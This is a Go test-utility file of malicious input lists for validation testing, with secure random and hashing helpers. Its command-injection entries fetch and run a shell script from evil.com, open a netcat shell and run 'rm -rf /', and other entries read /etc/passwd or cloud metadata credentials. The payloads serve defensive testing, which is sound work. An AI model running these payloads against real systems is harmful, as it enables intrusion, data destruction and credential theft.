package testutils

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"math/big"
	"strings"
	"testing"
)

type MaliciousInputs struct {
	SQLInjection     []string
	XSSPayloads      []string
	PathTraversal    []string
	CommandInjection []string
	LDAPInjection    []string
	NoSQLInjection   []string
	CSRFPayloads     []string
	XXE              []string
	SSRF             []string
	BufferOverflow   []string
	FormatString     []string
	Unicode          []string
	Encoding         []string
}

func GetMaliciousInputs() *MaliciousInputs {
	return &MaliciousInputs{
		SQLInjection: []string{
			"'; DROP TABLE users; --",
			"' OR '1'='1",
			"' UNION SELECT * FROM users --",
			"'; INSERT INTO users VALUES ('hacker', 'hacker@evil.com', 'password'); --",
			"' OR 1=1 --",
			"admin'--",
			"admin'/*",
			"' OR 'x'='x",
			"' AND id IS NULL; --",
			"'; EXEC xp_cmdshell('dir'); --",
			"' UNION SELECT password FROM users WHERE username='admin' --",
			"1'; DELETE FROM users; --",
			"' OR 'a'='a",
			"'; UPDATE users SET password='hacked' WHERE username='admin'; --",
			"' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
		},
		XSSPayloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src=javascript:alert('XSS')></iframe>",
			"<body onload=alert('XSS')>",
			"<input onfocus=alert('XSS') autofocus>",
			"<select onfocus=alert('XSS') autofocus>",
			"<textarea onfocus=alert('XSS') autofocus>",
			"<keygen onfocus=alert('XSS') autofocus>",
			"<video><source onerror=alert('XSS')>",
			"<audio src=x onerror=alert('XSS')>",
			"<details open ontoggle=alert('XSS')>",
			"<marquee onstart=alert('XSS')>",
			"<math><mi//xlink:href=data:x,<script>alert('XSS')</script>",
		},
		PathTraversal: []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			"....//....//....//etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%252F..%252F..%252Fetc%252Fpasswd",
			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
			"..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
			"..%255c..%255c..%255cetc%255cpasswd",
			"..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd",
			"..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd",
		},
		CommandInjection: []string{
			"; ls -la",
			"| cat /etc/passwd",
			"&& whoami",
			"|| id",
			"`whoami`",
			"$(whoami)",
			"; rm -rf /",
			"| nc -l -p 4444 -e /bin/sh",
			"&& wget http://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
			"|| curl http://evil.com/shell.sh | sh",
		},
		LDAPInjection: []string{
			"*)(uid=*))(|(uid=*",
			"*)(|(password=*))",
			"*)(|(objectClass=*))",
			"*)(|(mail=*))",
			"*)(|(cn=*))",
			"*)(|(sn=*))",
			"*)(|(givenName=*))",
			"*)(|(telephoneNumber=*))",
			"*)(|(userPassword=*))",
			"*)(|(description=*))",
		},
		NoSQLInjection: []string{
			"{\"$where\": \"this.username == this.password\"}",
			"{\"$ne\": null}",
			"{\"$gt\": \"\"}",
			"{\"$regex\": \".*\"}",
			"{\"$exists\": true}",
			"{\"$or\": [{\"username\": \"admin\"}, {\"password\": \"admin\"}]}",
			"{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
			"{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}",
			"{\"$where\": \"function() { return this.username == this.password; }\"}",
			"{\"$where\": \"this.username.match(/.*/)\"}",
		},
		CSRFPayloads: []string{
			"<form action=\"http://target.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"1000\"><input type=\"hidden\" name=\"to\" value=\"attacker\"><input type=\"submit\" value=\"Click me\"></form>",
			"<img src=\"http://target.com/transfer?amount=1000&to=attacker\">",
			"<iframe src=\"http://target.com/transfer?amount=1000&to=attacker\"></iframe>",
			"<script>fetch('http://target.com/transfer', {method: 'POST', body: 'amount=1000&to=attacker'})</script>",
			"<link rel=\"stylesheet\" href=\"http://target.com/transfer?amount=1000&to=attacker\">",
		},
		XXE: []string{
			"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
			"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>",
			"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
			"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
			"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,PHBocCBwaHBpbmZvKCk7ID8+\">]><foo>&xxe;</foo>",
		},
		SSRF: []string{
			"http://localhost:22",
			"http://127.0.0.1:22",
			"http://0.0.0.0:22",
			"http://[::1]:22",
			"http://169.254.169.254/",
			"http://metadata.google.internal/",
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/latest/user-data/",
			"http://169.254.169.254/latest/security-credentials/",
			"file:///etc/passwd",
			"file:///c:/windows/system32/drivers/etc/hosts",
			"gopher://127.0.0.1:22",
			"dict://127.0.0.1:22",
			"ldap://127.0.0.1:389",
		},
		BufferOverflow: []string{
			strings.Repeat("A", 1000),
			strings.Repeat("B", 10000),
			strings.Repeat("C", 100000),
			strings.Repeat("D", 1000000),
			strings.Repeat("E", 10000000),
		},
		FormatString: []string{
			"%x%x%x%x%x%x%x%x%x%x",
			"%p%p%p%p%p%p%p%p%p%p",
			"%s%s%s%s%s%s%s%s%s%s",
			"%n%n%n%n%n%n%n%n%n%n",
			"%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x",
			"%08p%08p%08p%08p%08p%08p%08p%08p%08p%08p",
		},
		Unicode: []string{
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
		},
		Encoding: []string{
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
			"<script>alert('XSS')</script>",
		},
	}
}

func GenerateSecureRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		b[i] = charset[num.Int64()]
	}
	return string(b), nil
}

func GenerateSecurePassword(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
	b := make([]byte, length)
	for i := range b {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		b[i] = charset[num.Int64()]
	}
	return string(b), nil
}

func HashVerificationToken(token string) string {
	sum := sha256.Sum256([]byte(token))
	return hex.EncodeToString(sum[:])
}

func AssertNoSQLInjection(t *testing.T, field string, value string, expectedError bool) {
	t.Helper()

	if strings.Contains(strings.ToLower(value), "drop table") {
		if !expectedError {
			t.Errorf("Expected SQL injection to be detected for field %s with value %s", field, value)
		}
	} else if expectedError {
		t.Errorf("Expected SQL injection error for field %s with value %s", field, value)
	}
}

func AssertNoXSS(t *testing.T, field string, value string, expectedError bool) {
	t.Helper()

	if strings.Contains(value, "<script>") {
		if !expectedError {
			t.Errorf("Expected XSS to be detected for field %s with value %s", field, value)
		}
	} else if expectedError {
		t.Errorf("Expected XSS error for field %s with value %s", field, value)
	}
}

func AssertNoPathTraversal(t *testing.T, field string, value string, expectedError bool) {
	t.Helper()

	if strings.Contains(value, "../") || strings.Contains(value, "..\\") {
		if !expectedError {
			t.Errorf("Expected path traversal to be detected for field %s with value %s", field, value)
		}
	} else if expectedError {
		t.Errorf("Expected path traversal error for field %s with value %s", field, value)
	}
}

func AssertValidationError(t *testing.T, field string, value string, expectedError bool, err error) {
	t.Helper()

	if expectedError && err == nil {
		t.Errorf("Expected validation error for %s field with value %s", field, value)
	} else if !expectedError && err != nil {
		t.Errorf("Unexpected validation error for %s field: %v", field, err)
	}
}
